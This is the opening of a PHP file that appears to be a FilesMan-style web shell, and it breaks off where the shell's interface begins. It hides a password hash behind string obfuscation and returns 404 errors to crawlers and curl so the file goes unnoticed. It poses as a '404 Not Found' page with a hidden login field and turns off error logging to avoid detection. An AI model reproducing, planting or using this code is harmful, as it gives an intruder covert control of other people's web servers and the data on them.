<?php
session_start(); $spfb762e = str_replace('pa', '', 'paspatparpa_pareplpaapacpae'); $sp1236e4 = $spfb762e('k', '', 'f6be2k2ac8779f309fa92ck828f1f52akaa'); if (!empty($_SERVER['HTTP_USER_AGENT'])) { $sp3a0d09 = array('Googlebot', 'Slurp', 'MSNBot', 'PycURL', 'facebookexternalhit', 'ia_archiver', 'crawler', 'Yandex', 'Rambler', 'Yahoo! Slurp', 'YahooSeeker', 'bingbot', 'curl'); if (preg_match('/' . implode('|', $sp3a0d09) . '/i', $_SERVER['HTTP_USER_AGENT'])) { header('HTTP/1.0 404 Not Found'); die; } } function login_app() { ?>
<!DOCTYPE html><html><head><title>404 Not Found</title><meta charset="UTF-8"><meta name="robots" content="NOINDEX, NOFOLLOW"></head><style type="text/css">
input[type=password] {
    width: 250px;
    height: 25px;
    color: white;
...
<center><form method="post"><input type="password" name="pas5dot"><br></form></center>
<?php  die; } if (!isset($_SESSION[md5($_SERVER['HTTP_HOST'])])) { if (md5($_POST['pas5dot']) == $sp1236e4) { $_SESSION[md5($_SERVER['HTTP_HOST'])] = true; } else { login_app(); } }

if(version_compare(PHP_VERSION,'5.3.0','<')){@set_magic_quotes_runtime(0);}
@clearstatcache();@ini_set('error_log',NULL);@ini_set('log_errors',0);@ini_set('max_execution_time',0);@ini_set('output_buffering',0);@ini_set('display_errors',0);$color="#00ff00";$default_action='FilesMan';$default_use_ajax=true;$default_charset='UTF-8';
echo '<!DOCTYPE HTML>
